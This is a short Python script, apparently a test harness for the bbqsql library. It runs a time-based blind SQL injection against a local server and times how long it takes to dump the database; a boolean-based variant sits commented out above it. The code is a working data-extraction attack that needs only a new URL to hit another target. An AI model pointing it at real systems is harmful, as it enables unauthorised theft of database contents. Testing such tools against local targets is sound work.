import bbqsql
from time import time
from urllib import quote
'''
url = bbqsql.Query('http://127.0.0.1:8090/boolean?${query}')
bh = bbqsql.BlindHTTP(url=url)
start = time()
results = bh.run(concurrency=100)
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

url = bbqsql.Query('http://127.0.0.1:8090/time?${query}')
query = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:.5}&foo=${user_query:unimportant}",encoder=quote)

bh = bbqsql.BlindHTTP(url=url,query=query,comparison_attr='response_time')
start = time()
results = bh.run(concurrency=75,sleep=.5)
stop = time()

print "dumped db in %f seconds" % (stop-start)